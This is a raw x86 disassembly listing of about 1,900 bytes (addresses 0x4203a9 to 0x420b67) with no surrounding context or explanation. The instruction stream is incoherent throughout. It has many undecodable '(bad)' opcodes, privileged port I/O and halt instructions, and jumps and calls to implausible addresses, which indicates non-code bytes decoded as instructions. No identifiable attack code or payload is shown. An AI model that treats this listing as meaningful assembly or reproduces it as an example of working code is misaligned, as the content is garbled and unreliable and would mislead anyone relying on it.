  4203a9:	not    DWORD PTR [ecx]
  4203ab:	jg     0x4203a3
  4203ad:	hlt    
  4203ae:	popfw  
  4203b0:	mov    WORD PTR [ebp-0x384fd179],fs
  4203b6:	stc    
  4203b7:	mov    bl,ah
  4203b9:	push   ecx
  4203ba:	rcl    DWORD PTR [ecx+eax*1-0x42],0x71
  4203bf:	mov    esi,0xffb666be
  4203c4:	mov    ds:0x2c2212d0,al
  4203c9:	out    0x79,eax
  4203cb:	sub    BYTE PTR [ebx-0x38a96cae],dh
  4203d1:	repz mov eax,0x77dcfffe
  4203d7:	inc    ecx
  4203d8:	and    esi,ebp
  4203da:	cdq    
  4203db:	lds    edi,FWORD PTR [edi+0x3d5b4a22]
  4203e1:	jbe    0x420393
  4203e3:	call   0x7ca99c31
  4203e8:	les    eax,FWORD PTR [eax-0x6c]
  4203eb:	pop    ebx
  4203ec:	xlat   BYTE PTR ds:[ebx]
  4203ed:	dec    ecx
  4203ee:	mov    ds:0x4361173a,eax
  4203f3:	push   0xffffffb2
  4203f5:	and    eax,0x33e0276a
  4203fa:	mov    bl,0x4b
  4203fc:	sub    eax,0xde1fba3b
  420401:	neg    al
  420403:	mov    ebx,0x4022b2d3
  420408:	loope  0x4203d7
  42040a:	not    DWORD PTR [ecx-0x6]
  42040d:	adc    BYTE PTR [ecx+edx*2+0x27],al
  420411:	addr16 push ebx
  420413:	call   0x6e0e4c93
  420418:	iret   
  420419:	test   al,0xbf
  42041b:	push   esp
  42041c:	push   ecx
  42041d:	pop    ebx
  42041e:	xor    al,0xa
  420420:	loop   0x420461
  420422:	je     0x4203fa
  420424:	cmp    esp,DWORD PTR [ebx]
  420426:	lods   al,BYTE PTR ds:[esi]
  420427:	pop    esi
  420428:	adc    al,0x41
  42042a:	xor    edx,ecx
  42042c:	scas   eax,DWORD PTR es:[edi]
  42042d:	out    dx,al
  42042e:	mov    bl,0x3a
  420430:	push   ds
  420431:	push   0x7d8087eb
  420436:	hlt    
  420437:	and    DWORD PTR [eax],ebp
  420439:	mov    cl,0x62
  42043b:	xor    eax,0x70a934d1
  420440:	test   esp,edi
  420442:	xor    ch,ch
  420444:	popa   
  420445:	(bad)  
  420446:	repnz push ds
  420448:	shl    BYTE PTR [eax+0x7b5bcbf5],cl
  42044e:	xor    eax,ebx
  420450:	test   BYTE PTR [edi+eax*1+0x1c],bl
  420454:	cmp    al,0xac
  420456:	cmp    esi,DWORD PTR [edx+0x6f7fe830]
  42045c:	xor    dh,BYTE PTR [edx+0x6c44dad9]
  420462:	data16 (bad) 
  420464:	fldenv [eax-0x28]
  420467:	mov    dl,dl
  420469:	lahf   
  42046a:	test   DWORD PTR ds:0xb1fd27f,ebp
  420470:	mov    dh,0x34
  420472:	mov    BYTE PTR [ecx],dl
  420474:	lds    edi,FWORD PTR [edi-0x3ecee752]
  42047a:	push   esp
  42047b:	pop    edi
  42047c:	sahf   
  42047d:	or     ah,BYTE PTR [ebp+0x7]
  420480:	faddp  st(4),st
  420482:	cmp    dh,BYTE PTR [eax+0x687ef32c]
  420488:	(bad)  
  420489:	pop    esp
  42048a:	out    dx,al
  42048b:	mov    WORD PTR [ecx],fs
  42048d:	adc    al,0x7e
  42048f:	imul   ebp,DWORD PTR [edi-0x3403c319],0x1d
  420496:	(bad)  
  420497:	leave  
  420498:	clc    
  420499:	inc    ebx
  42049a:	leave  
  42049b:	inc    ebx
  42049c:	mov    DWORD PTR fs:[edx+0x62],edx
  4204a0:	(bad)  
  4204a1:	ror    DWORD PTR [edx+0x689a43af],1
  4204a7:	mov    bh,0x7c
  4204a9:	stos   DWORD PTR es:[edi],eax
  4204aa:	cli    
  4204ab:	ror    esi,0x98
  4204ae:	sbb    BYTE PTR [edx],cl
  4204b0:	sbb    BYTE PTR [edx+ebx*2],dl
  4204b3:	add    BYTE PTR ds:0x44e4e53c,bh
  4204b9:	add    eax,0xcbc14469
  4204be:	jbe    0x420482
  4204c0:	imul   edx,DWORD PTR [ebp+0x7c4fd80e],0x15
  4204c7:	mov    bl,dh
  4204c9:	add    DWORD PTR [ebx-0x51],ecx
  4204cc:	cmp    dl,dh
  4204ce:	cmp    esp,edi
  4204d0:	sub    BYTE PTR [ecx+ebx*2-0x3d],ch
  4204d4:	es aam 0xb7
  4204d7:	sub    eax,0x3bf0d763
  4204dc:	pop    eax
  4204dd:	xor    ah,BYTE PTR [edx-0x7d]
  4204e0:	sbb    ah,dh
  4204e2:	cli    
  4204e3:	clc    
  4204e4:	fistp  QWORD PTR [eax]
  4204e7:	aad    0x72
  4204e9:	outs   dx,BYTE PTR ds:[esi]
  4204ea:	mov    edi,0x8c338784
  4204ef:	leave  
  4204f0:	jb     0x4204ce
  4204f2:	in     eax,dx
  4204f3:	stos   BYTE PTR es:[edi],al
  4204f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204f6:	pop    ebp
  4204f7:	push   eax
  4204f8:	inc    ebp
  4204f9:	mov    dl,0x94
  4204fb:	mov    al,0x91
  4204fd:	cmp    bh,BYTE PTR [ebx-0x62d3b78d]
  420503:	iret   
  420504:	sbb    ebx,DWORD PTR [edi+ebp*4]
  420507:	loope  0x420550
  420509:	mov    edx,0xb0985d5f
  42050e:	or     BYTE PTR [ebp+0x7e9e10c6],cl
  420514:	push   ss
  420515:	pop    eax
  420516:	aas    
  420517:	fisub  WORD PTR [edx-0xdb0e49d]
  42051d:	ror    cl,1
  42051f:	jmp    0xedb057a7
  420524:	fwait
  420525:	dec    esi
  420526:	sub    ch,dh
  420528:	mov    al,ds:0xd8780e96
  42052d:	cs mov bh,0x28
  420530:	xor    ecx,DWORD PTR [ecx+0x1b54df7c]
  420536:	sub    BYTE PTR [ebx-0x78039c1e],dl
  42053c:	add    BYTE PTR [esi],ah
  42053e:	and    ah,BYTE PTR [edi]
  420540:	add    DWORD PTR [edi-0x5b],ecx
  420543:	in     eax,dx
  420544:	mov    dh,0x8a
  420546:	add    BYTE PTR [ebp-0x7730960c],ch
  42054c:	(bad)  
  42054d:	sub    BYTE PTR [ecx+0x802df14],dh
  420553:	sbb    cl,BYTE PTR [ebx+0x7c0a4472]
  420559:	fxch   st(6)
  42055b:	sti    
  42055c:	or     ebx,esp
  42055e:	push   ebp
  42055f:	jo     0x420528
  420561:	xor    edi,DWORD PTR [ecx]
  420563:	inc    edi
  420564:	push   edx
  420565:	sub    BYTE PTR [esi+0x57],0x74
  420569:	jns    0x4205ac
  42056b:	push   ecx
  42056c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42056d:	loope  0x420571
  42056f:	pop    ds
  420570:	and    eax,0x30327b41
  420575:	in     al,dx
  420576:	adc    eax,0x5f5559b4
  42057b:	fidivr WORD PTR [eax]
  42057d:	xchg   ebp,eax
  42057e:	int    0xbb
  420580:	jl     0x420546
  420582:	loopne 0x42059b
  420584:	jmp    0x603b6372
  420589:	mov    esp,0xc73e7fb0
  42058e:	push   ss
  42058f:	and    al,0xa0
  420591:	loope  0x4205e5
  420593:	and    BYTE PTR [ebp+0x51e82c1e],0xdf
  42059a:	mov    bh,0xd7
  42059c:	dec    edi
  42059d:	mov    esp,ebp
  42059f:	inc    edx
  4205a0:	div    BYTE PTR [ebx]
  4205a2:	js     0x420571
  4205a4:	xor    ch,BYTE PTR [edx-0xf]
  4205a7:	bound  edx,QWORD PTR [ebx-0x722a816e]
  4205ad:	ss mov dh,0x6e
  4205b0:	hlt    
  4205b1:	mov    al,ds:0x41b71ff5
  4205b6:	nop
  4205b7:	and    al,0xc6
  4205b9:	in     eax,0xa2
  4205bb:	lahf   
  4205bc:	(bad)  [ebp+0x48c9c7d8]
  4205c2:	xchg   ebx,eax
  4205c3:	cwde   
  4205c4:	stos   BYTE PTR es:[edi],al
  4205c5:	add    al,BYTE PTR [edi+eax*8-0x5ae0164]
  4205cc:	test   BYTE PTR [esi+0x67123a08],ch
  4205d2:	inc    esp
  4205d3:	push   ecx
  4205d4:	xchg   esp,eax
  4205d5:	aaa    
  4205d6:	adc    BYTE PTR [esi+0x70],ah
  4205d9:	push   eax
  4205da:	inc    esp
  4205db:	dec    ebx
  4205dc:	adc    DWORD PTR [eax-0x7cc43c2],edx
  4205e2:	loopne 0x4205db
  4205e4:	xor    cl,BYTE PTR [esi+eax*2-0x69327e65]
  4205eb:	fldcw  WORD PTR [ebx]
  4205ed:	pop    ebx
  4205ee:	mov    esi,0x22e919e0
  4205f3:	push   esp
  4205f4:	dec    ebp
  4205f5:	adc    al,0x5c
  4205f7:	shr    BYTE PTR [edi+0x6b],cl
  4205fa:	fs xor al,0x4e
  4205fd:	call   0xb6b164ca
  420602:	(bad)  
  420603:	mov    esp,0xfbc09cc2
  420608:	adc    DWORD PTR [edx],edx
  42060a:	nop
  42060b:	pop    ebp
  42060c:	cld    
  42060d:	xor    edx,ebx
  42060f:	out    dx,eax
  420610:	(bad)  [esi-0x4]
  420613:	push   cs
  420614:	and    DWORD PTR [esi-0x3b],ebx
  420617:	ss push ecx
  420619:	dec    ebp
  42061a:	and    al,0x72
  42061c:	int    0xfa
  42061e:	scas   eax,DWORD PTR es:[edi]
  42061f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420620:	mov    al,ds:0x78aed74f
  420625:	sub    edx,edi
  420627:	sbb    al,0xae
  420629:	pop    ecx
  42062a:	xchg   edi,eax
  42062b:	mov    bl,0x3d
  42062d:	fs push eax
  42062f:	ret    
  420630:	mov    ebp,0x829d2b90
  420635:	jle    0x420650
  420637:	cmp    BYTE PTR [eax],ch
  420639:	add    edx,ecx
  42063b:	inc    edi
  42063c:	or     edx,ebp
  42063e:	rcl    eax,1
  420640:	xchg   esp,eax
  420641:	mov    edi,0x6dc66fa0
  420646:	lock or DWORD PTR [ecx+0x443e1024],0x63
  42064e:	ins    DWORD PTR es:[edi],dx
  42064f:	mov    esp,0x1fee9b41
  420654:	mov    ecx,0xc1959a9
  420659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42065a:	fst    DWORD PTR [eax+0x1b]
  42065d:	adc    al,0x4f
  42065f:	adc    dh,BYTE PTR [ecx+esi*4-0x1e498ec7]
  420666:	or     ecx,ebp
  420668:	jle    0x420655
  42066a:	mov    ch,0xc3
  42066c:	mov    esp,esp
  42066e:	(bad)  
  42066f:	clc    
  420670:	daa    
  420671:	and    DWORD PTR [edx+0xbb7a6b1],0xffffffc2
  420678:	data16 sbb dh,BYTE PTR [edx+0x54]
  42067c:	stc    
  42067d:	xchg   edx,eax
  42067e:	xlat   BYTE PTR ds:[ebx]
  42067f:	js     0x42064e
  420681:	mul    edi
  420683:	xchg   ebx,eax
  420684:	inc    edi
  420685:	ins    BYTE PTR es:[edi],dx
  420686:	lahf   
  420687:	cld    
  420688:	stos   BYTE PTR es:[edi],al
  420689:	sbb    eax,0xf7ab9d14
  42068e:	mov    al,ds:0xb5dbed04
  420693:	mov    dl,0x75
  420695:	enter  0x4605,0xf
  420699:	mov    eax,0xc778cb62
  42069e:	enter  0x7c0a,0xb2
  4206a2:	sbb    al,0xd8
  4206a4:	fsubr  QWORD PTR [edi+0x7f]
  4206a7:	mov    es,WORD PTR [ebx+0x66c21206]
  4206ad:	sbb    DWORD PTR [ebp+0x5a],esp
  4206b0:	imul   edi,DWORD PTR [edi-0x66],0x52
  4206b4:	out    0xc5,al
  4206b6:	mov    al,0xa2
  4206b8:	xor    al,BYTE PTR [ebp-0x68161a44]
  4206be:	sbb    BYTE PTR [eax],0x93
  4206c1:	leave  
  4206c2:	in     al,dx
  4206c3:	clc    
  4206c4:	ret    0x7cd1
  4206c7:	hlt    
  4206c8:	in     eax,0x9c
  4206ca:	mov    WORD PTR [ebx+0x6bb909bd],es
  4206d0:	jecxz  0x4206a2
  4206d2:	mov    esi,0x98cd1ee3
  4206d7:	xchg   esp,eax
  4206d8:	sbb    BYTE PTR [esi-0x19b6fd92],ah
  4206de:	cmp    eax,0x944b6919
  4206e3:	inc    esp
  4206e4:	add    al,0xce
  4206e6:	cmp    al,0xec
  4206e8:	stc    
  4206e9:	fidiv  DWORD PTR [ebx+eiz*4]
  4206ec:	fdiv   DWORD PTR [ebp+esi*8-0x5fb0a130]
  4206f3:	cmp    dl,BYTE PTR ds:0x2eccfcc8
  4206f9:	or     edx,0x8145d7ea
  4206ff:	cld    
  420700:	sub    eax,0x1885cf48
  420705:	xchg   ebx,eax
  420706:	cmp    eax,0x55b206b
  42070b:	popf   
  42070c:	sbb    edx,DWORD PTR [edx]
  42070e:	loop   0x42069c
  420710:	cs sti 
  420712:	out    dx,eax
  420713:	rcl    DWORD PTR [eax-0x73],cl
  420716:	add    al,0x9e
  420718:	fnop   
  42071a:	and    al,0x2
  42071c:	jge    0x4206f9
  42071e:	pop    edx
  42071f:	mov    bh,0x8a
  420721:	sub    ecx,eax
  420723:	pop    esi
  420724:	test   al,0x56
  420726:	div    BYTE PTR [ebx-0x60]
  420729:	mov    fs,WORD PTR [edi+0x4a]
  42072c:	fimul  WORD PTR [esi-0x62708b8e]
  420732:	add    ah,BYTE PTR [ecx+0x50e1f4ff]
  420738:	dec    edi
  420739:	adc    eax,0xb27bfca9
  42073e:	test   DWORD PTR [edx-0x2a9e4799],ecx
  420744:	es loope 0x42077a
  420747:	(bad)  
  420748:	cmp    ah,BYTE PTR [edi+0x45]
  42074b:	out    dx,eax
  42074c:	pop    eax
  42074d:	xchg   DWORD PTR [eax],eax
  42074f:	dec    esi
  420750:	mov    esi,0xa06976fa
  420755:	data16 je 0x420783
  420758:	xchg   ebx,eax
  420759:	xchg   DWORD PTR [edx+0x5],ebx
  42075c:	ret    
  42075d:	mov    ebx,0x6f3aedc3
  420762:	fsubr  DWORD PTR ds:0xd943759c
  420768:	shr    DWORD PTR [ecx],cl
  42076a:	out    dx,al
  42076b:	(bad)  
  42076c:	xor    dh,al
  42076e:	and    al,0xf0
  420770:	pop    ecx
  420771:	push   cs
  420772:	push   ds
  420773:	jmp    0x6367:0x48142b90
  42077a:	push   0x7a
  42077c:	add    cl,dh
  42077e:	and    DWORD PTR [ebx+0x71],ebp
  420781:	iret   
  420782:	jne    0x42074a
  420784:	clc    
  420785:	test   al,0xee
  420787:	call   0x1dc8a3c0
  42078c:	adc    ebp,ebx
  42078e:	jmp    0xe938a595
  420793:	push   esi
  420794:	test   al,0x8
  420796:	mov    ds:0x91ced1d1,al
  42079b:	sar    esp,cl
  42079d:	pop    ecx
  42079e:	les    ebx,FWORD PTR [ecx]
  4207a0:	lods   al,BYTE PTR ds:[esi]
  4207a1:	pop    esp
  4207a2:	add    al,0xd
  4207a4:	mov    ebx,0x6ed6f491
  4207a9:	push   edx
  4207aa:	dec    ebp
  4207ab:	in     eax,0x74
  4207ad:	sub    DWORD PTR [ecx+esi*2-0x6d1fad6f],esi
  4207b4:	dec    ebp
  4207b5:	sub    DWORD PTR [esi+edi*2],edi
  4207b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207b9:	popa   
  4207ba:	jo     0x420821
  4207bc:	addr16 push cs
  4207be:	pop    edi
  4207bf:	push   edx
  4207c0:	pop    ebx
  4207c1:	pop    ebp
  4207c2:	mov    ch,0xb5
  4207c4:	sbb    eax,0x454cbbef
  4207ca:	(bad)  
  4207cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207cc:	mov    edx,0x89802aec
  4207d1:	ror    ecx,0x1c
  4207d4:	(bad)  
  4207d5:	push   esi
  4207d6:	pop    es
  4207d7:	jmp    0x4207d1
  4207d9:	and    DWORD PTR [ebp+0x11a40ea8],esi
  4207df:	pop    ebp
  4207e0:	xor    eax,0xcd9dd71b
  4207e5:	jle    0x4207a2
  4207e7:	push   ebx
  4207e8:	mov    al,cl
  4207ea:	xchg   DWORD PTR [esp+ebp*1+0x68b42342],esp
  4207f1:	stos   DWORD PTR es:[edi],eax
  4207f2:	push   edx
  4207f3:	in     al,0x7c
  4207f5:	les    ecx,FWORD PTR [eax+esi*4]
  4207f8:	stos   BYTE PTR es:[edi],al
  4207f9:	and    al,0xc3
  4207fb:	xor    BYTE PTR [edi-0x66],bl
  4207fe:	inc    eax
  4207ff:	or     eax,0xac65b7d4
  420804:	sub    BYTE PTR [esi],ch
  420806:	loop   0x4207f9
  420808:	fidivr DWORD PTR [esi-0x2ca8bc09]
  42080e:	scas   eax,DWORD PTR es:[edi]
  42080f:	loope  0x420791
  420811:	fisubr WORD PTR [esi+0x3f]
  420814:	call   0x7ca599bb
  420819:	push   cs
  42081a:	jmp    0xba09:0x5b730904
  420821:	arpl   ax,bx
  420823:	ret    0x8d84
  420826:	pop    ecx
  420827:	call   0x46ec0177
  42082c:	cmp    BYTE PTR [ebx+0x2582747e],0x49
  420833:	fisttp QWORD PTR [esi-0x3d]
  420836:	pop    esi
  420837:	sub    BYTE PTR [esi],cl
  420839:	sbb    BYTE PTR [edi],0x51
  42083c:	inc    ecx
  42083d:	cmp    ebx,DWORD PTR [ebx-0x75b3be80]
  420843:	jae    0x4207ea
  420845:	and    eax,esp
  420847:	sbb    ecx,0x10d6bd4
  42084d:	bound  ecx,QWORD PTR [esi+0x7c]
  420850:	mov    esp,edx
  420852:	pcmpgtd mm7,QWORD PTR [eax]
  420855:	sti    
  420856:	test   BYTE PTR [esi],bh
  420858:	or     eax,edi
  42085a:	push   ebp
  42085b:	push   ds
  42085c:	enter  0x79da,0xe0
  420860:	pushf  
  420861:	inc    edi
  420862:	mov    ebx,DWORD PTR [edx-0x66]
  420865:	jno    0x4208dd
  420867:	inc    ecx
  420868:	test   al,0x7c
  42086a:	adc    al,0xcc
  42086c:	jp     0x4208ca
  42086e:	in     al,0x9a
  420870:	sbb    eax,0x8f320da8
  420875:	mov    bl,0x4e
  420877:	add    ebx,DWORD PTR [ebp+0xb0a9ff5]
  42087d:	pop    edx
  42087e:	ret    
  42087f:	loopne 0x4208b2
  420881:	dec    ebx
  420882:	sub    eax,0x76c33ddc
  420887:	mov    edx,0x77aed7b0
  42088c:	add    BYTE PTR [ebx-0x4d],al
  42088f:	in     al,0x94
  420891:	xchg   edx,eax
  420892:	and    DWORD PTR [ebp+0x1123dde0],0x10
  420899:	shl    edi,1
  42089b:	iret   
  42089c:	inc    esp
  42089d:	push   0x3e800ed4
  4208a2:	mov    dl,0xc7
  4208a4:	fldcw  WORD PTR [esi+0x2e1f6366]
  4208aa:	mov    cl,0x73
  4208ac:	cli    
  4208ad:	ins    DWORD PTR es:[edi],dx
  4208ae:	push   ss
  4208af:	mov    WORD PTR [eax+eiz*8],?
  4208b2:	retf   0xcc3c
  4208b5:	test   al,0xb3
  4208b7:	mov    ebp,0x131aad77
  4208bc:	jp     0x4208d4
  4208be:	mov    dl,0x6a
  4208c0:	pop    esp
  4208c1:	(bad)  
  4208c2:	xlat   BYTE PTR ds:[ebx]
  4208c3:	xchg   ebx,eax
  4208c4:	(bad)  
  4208c5:	loop   0x420890
  4208c7:	sahf   
  4208c8:	xchg   esi,eax
  4208c9:	and    BYTE PTR [edx-0x6660407f],0xf3
  4208d0:	test   eax,0xe6f6b55b
  4208d5:	sbb    ah,BYTE PTR [esi+0x294da86f]
  4208db:	(bad)  
  4208dc:	cli    
  4208dd:	sub    DWORD PTR [edi+0x64d048cb],esp
  4208e3:	push   edi
  4208e4:	pusha  
  4208e5:	lds    esp,FWORD PTR [edi-0x57]
  4208e8:	add    ebx,DWORD PTR [edi+0x2e]
  4208eb:	psubsw mm0,QWORD PTR [edi]
  4208ee:	mov    dl,0x97
  4208f0:	js     0x420960
  4208f2:	cmp    al,cl
  4208f4:	hlt    
  4208f5:	fld    st(3)
  4208f7:	lahf   
  4208f8:	test   BYTE PTR [ebp+eax*8+0x4c],ah
  4208fc:	std    
  4208fd:	xchg   ebx,eax
  4208fe:	sbb    al,0xc8
  420900:	outs   dx,BYTE PTR ds:[esi]
  420901:	xor    eax,ecx
  420903:	cmc    
  420904:	add    BYTE PTR [esi],bl
  420906:	repnz outs dx,BYTE PTR ds:[esi]
  420908:	pop    ebx
  420909:	scas   eax,DWORD PTR es:[edi]
  42090a:	jmp    0xbbc9:0xf2c8200f
  420911:	mov    esi,0xca41b4db
  420916:	add    al,0x9f
  420918:	and    eax,DWORD PTR [edi]
  42091a:	js     0x420957
  42091c:	and    BYTE PTR [eax-0x28],dh
  42091f:	inc    ebp
  420920:	jg     0x42099f
  420922:	and    esi,DWORD PTR [edx-0x6d]
  420925:	cmp    al,0x2b
  420927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420928:	jecxz  0x420935
  42092a:	ss xchg edx,eax
  42092c:	jp     0x420984
  42092e:	push   0xd7462ab0
  420933:	ds jae 0x4209a2
  420936:	cmp    ah,0x1d
  420939:	lahf   
  42093a:	dec    edi
  42093b:	sbb    ebx,DWORD PTR [esi+0x5a04af1a]
  420941:	dec    ebp
  420942:	jg     0x4208d5
  420944:	sbb    BYTE PTR [edx+0x2b],ah
  420947:	and    BYTE PTR [ebp+eiz*8-0x69],0xd0
  42094c:	jbe    0x42097c
  42094e:	leave  
  42094f:	iret   
  420950:	mov    dh,0x88
  420952:	mov    WORD PTR [edx+0xd9a67ad],gs
  420958:	icebp  
  420959:	push   ecx
  42095a:	pop    esi
  42095b:	(bad)  
  42095c:	and    al,0xf
  42095e:	in     eax,0x7b
  420960:	jl     0x4208ea
  420962:	push   eax
  420963:	fld    DWORD PTR [edi+0x9]
  420966:	data16 (bad) 
  420968:	in     eax,dx
  420969:	add    esi,ecx
  42096b:	inc    esp
  42096c:	aas    
  42096d:	sbb    al,0x95
  42096f:	mov    bl,0xa
  420971:	fwait
  420972:	xchg   DWORD PTR [ecx],ebx
  420974:	xchg   ecx,eax
  420975:	mov    ebx,0x98888072
  42097a:	icebp  
  42097b:	jle    0x4209d4
  42097d:	mov    ch,0x38
  42097f:	(bad)  
  420980:	call   0xf6ec:0x54f6d21f
  420987:	push   ebx
  420988:	dec    esp
  420989:	xchg   ebx,eax
  42098a:	es xchg ebp,eax
  42098c:	mov    bl,BYTE PTR [eax-0x29f91821]
  420992:	mov    ch,0x62
  420994:	xchg   DWORD PTR [edx-0x92cd38f],ebx
  42099a:	add    eax,esp
  42099c:	ror    BYTE PTR [eax],0x81
  42099f:	ror    dh,1
  4209a1:	enter  0xebca,0x17
  4209a5:	sbb    ecx,DWORD PTR [ebx]
  4209a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209a8:	int3   
  4209a9:	ret    
  4209aa:	sub    DWORD PTR [eax],ecx
  4209ac:	fs es push esi
  4209af:	in     al,0xfe
  4209b1:	lea    ebp,[ebx]
  4209b3:	loope  0x4209fa
  4209b5:	add    eax,ebx
  4209b7:	sahf   
  4209b8:	xor    BYTE PTR [ecx+0x67],0x9e
  4209bc:	sbb    eax,0x11922cba
  4209c1:	shl    BYTE PTR [ebx-0x3487bc85],0xf6
  4209c8:	xchg   ebp,eax
  4209c9:	je     0x420a30
  4209cb:	mov    ah,0xeb
  4209cd:	jns    0x4209e9
  4209cf:	or     DWORD PTR [edi],eax
  4209d1:	pop    eax
  4209d2:	aad    0xb5
  4209d4:	inc    edx
  4209d5:	out    0x7a,al
  4209d7:	pop    ebp
  4209d8:	add    BYTE PTR [ebx+0x55],dl
  4209db:	add    bl,BYTE PTR [esi-0x1d]
  4209de:	lock loop 0x420a53
  4209e1:	lods   eax,DWORD PTR ds:[esi]
  4209e2:	jno    0x4209d2
  4209e4:	fdiv   DWORD PTR ds:0x89e6c6f2
  4209ea:	dec    ebx
  4209eb:	push   edi
  4209ec:	pop    ecx
  4209ed:	mov    bh,dl
  4209ef:	pop    esp
  4209f0:	sbb    esi,DWORD PTR [ebp+0x38]
  4209f3:	mov    es,WORD PTR [edi+0x3cc624a5]
  4209f9:	inc    edi
  4209fa:	in     al,0x65
  4209fc:	jp     0x420a2e
  4209fe:	ret    
  4209ff:	mov    esi,0x3302e50c
  420a04:	mov    cl,0x9a
  420a06:	jnp    0x420a46
  420a08:	xchg   BYTE PTR [ebx+0x6f],al
  420a0b:	adc    ecx,eax
  420a0d:	sti    
  420a0e:	xchg   BYTE PTR [esi+0x39],bl
  420a11:	loopne 0x420a19
  420a13:	es cs and eax,0x18507e76
  420a1a:	mov    edx,0xa82cff8c
  420a1f:	cmp    al,0x67
  420a21:	dec    edi
  420a22:	sub    al,0x67
  420a24:	ds test al,0x63
  420a27:	adc    DWORD PTR [edi-0x3df19303],esp
  420a2d:	in     eax,0x2c
  420a2f:	aam    0x3d
  420a31:	mov    ebp,0xc46fd829
  420a36:	pop    edx
  420a37:	adc    dh,BYTE PTR [ebx]
  420a39:	outs   dx,BYTE PTR ds:[esi]
  420a3a:	add    DWORD PTR [esi],ebp
  420a3c:	repnz adc DWORD PTR [edx],esi
  420a3f:	jp     0x420a85
  420a41:	mov    bl,0x74
  420a43:	cmp    DWORD PTR [eax-0x3f],ecx
  420a46:	xor    DWORD PTR [esi-0x74bd8c2b],esi
  420a4c:	jp     0x4209ff
  420a4e:	in     eax,0x7c
  420a50:	outs   dx,DWORD PTR ds:[esi]
  420a51:	sbb    al,0xef
  420a53:	icebp  
  420a54:	outs   dx,BYTE PTR ds:[esi]
  420a55:	sti    
  420a56:	sbb    al,bh
  420a58:	inc    esp
  420a59:	mov    ebx,0x6e82ec27
  420a5e:	push   esi
  420a5f:	adc    al,0x9e
  420a61:	cmp    ah,BYTE PTR [ebx+0x12]
  420a64:	xor    al,0x24
  420a66:	nop
  420a67:	xchg   ecx,eax
  420a68:	fcomp  DWORD PTR [edi+0x2d628a3]
  420a6e:	(bad)  
  420a70:	inc    eax
  420a71:	cmc    
  420a72:	mov    ebp,0x564a31b8
  420a77:	fstp   st(1)
  420a79:	sbb    BYTE PTR [ebx-0x4e1a00aa],dh
  420a7f:	or     DWORD PTR [ebx-0x5b231bf1],edx
  420a85:	pop    ds
  420a86:	icebp  
  420a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a88:	sbb    al,0x13
  420a8a:	push   es
  420a8b:	(bad)  
  420a8c:	sbb    DWORD PTR ss:[esi],ebp
  420a8f:	xchg   edi,eax
  420a90:	sub    eax,DWORD PTR [eax-0x51]
  420a93:	lea    esp,[esi]
  420a95:	jge    0x420aa4
  420a97:	or     DWORD PTR [esi+0x34],esp
  420a9a:	inc    esi
  420a9b:	add    DWORD PTR [edx-0x4c],esi
  420a9e:	inc    edi
  420a9f:	lock hlt 
  420aa1:	jge    0x420aeb
  420aa3:	int    0x75
  420aa5:	retf   
  420aa6:	jbe    0x420ad3
  420aa8:	xlat   BYTE PTR ds:[ebx]
  420aa9:	sahf   
  420aaa:	pop    ebx
  420aab:	mov    WORD PTR [ebx],ds
  420aad:	dec    ecx
  420aae:	adc    BYTE PTR [esi+0x16],bh
  420ab1:	(bad)  
  420ab3:	adc    eax,0xe33fd6e
  420ab8:	cld    
  420ab9:	scas   eax,DWORD PTR es:[edi]
  420aba:	push   esp
  420abb:	jp     0x420af0
  420abd:	(bad)  
  420abe:	adc    eax,0x21bc4019
  420ac3:	clc    
  420ac4:	add    eax,0x5f30e573
  420ac9:	loope  0x420a86
  420acb:	ins    BYTE PTR es:[edi],dx
  420acc:	pop    esi
  420acd:	ins    BYTE PTR es:[edi],dx
  420ace:	pop    esi
  420acf:	popf   
  420ad0:	jbe    0x420acc
  420ad2:	jmp    0xeb557fce
  420ad7:	and    ebp,esi
  420ad9:	adc    BYTE PTR [edx-0x72fec5ae],bh
  420adf:	pop    ebx
  420ae0:	in     al,dx
  420ae1:	fisttp QWORD PTR [esi+0x544d24e2]
  420ae7:	mov    esp,fs
  420ae9:	int    0x9
  420aeb:	sub    esp,0xe1302fba
  420af1:	dec    esp
  420af2:	and    DWORD PTR [edx+0x75],eax
  420af5:	in     al,dx
  420af6:	cld    
  420af7:	cdq    
  420af8:	fisub  DWORD PTR [ebp-0x51]
  420afb:	lea    edi,[esi+0x26]
  420afe:	aaa    
  420aff:	xchg   esp,eax
  420b00:	aad    0xe9
  420b02:	push   ss
  420b03:	(bad)  
  420b04:	pop    esp
  420b05:	push   edi
  420b06:	push   edi
  420b07:	in     al,0x1c
  420b09:	je     0x420aa2
  420b0b:	fisttp QWORD PTR [edi+0x3246dc0b]
  420b11:	daa    
  420b12:	shr    DWORD PTR [eax-0x28db1f75],0x69
  420b19:	cmp    eax,DWORD PTR [ebx-0x3f502b4f]
  420b1f:	dec    ebx
  420b20:	pop    ebp
  420b21:	pop    es
  420b22:	fdivr  DWORD PTR [edi-0x63]
  420b25:	pop    DWORD PTR ds:0x1cddb63b
  420b2b:	sbb    al,0xb3
  420b2d:	mov    cs,WORD PTR [edx+0x48]
  420b30:	leave  
  420b31:	outs   dx,DWORD PTR ds:[esi]
  420b32:	aam    0x10
  420b34:	aam    0x82
  420b36:	outs   dx,BYTE PTR ds:[esi]
  420b37:	scas   al,BYTE PTR es:[edi]
  420b38:	mov    eax,0xc2bb13ef
  420b3d:	push   esp
  420b3e:	cs sbb eax,0x52c2b1c1
  420b44:	das    
  420b45:	xchg   edi,eax
  420b46:	rcr    BYTE PTR [eax],1
  420b48:	pop    ebx
  420b49:	pop    ebp
  420b4a:	out    dx,eax
  420b4b:	outs   dx,DWORD PTR ds:[esi]
  420b4c:	neg    DWORD PTR [ecx+0xc]
  420b4f:	push   ecx
  420b50:	leave  
  420b51:	sbb    al,0xf
  420b53:	loope  0x420b56
  420b55:	cli    
  420b56:	into   
  420b57:	inc    ebx
  420b58:	or     BYTE PTR [edi-0x32],0x1
  420b5c:	pop    edi
  420b5d:	lea    edi,[esi+0x52]
  420b60:	outs   dx,DWORD PTR ds:[esi]
  420b61:	loop   0x420b4d
  420b63:	bsr    ecx,edi
  420b66:	pop    edi
  420b67:	push   ss
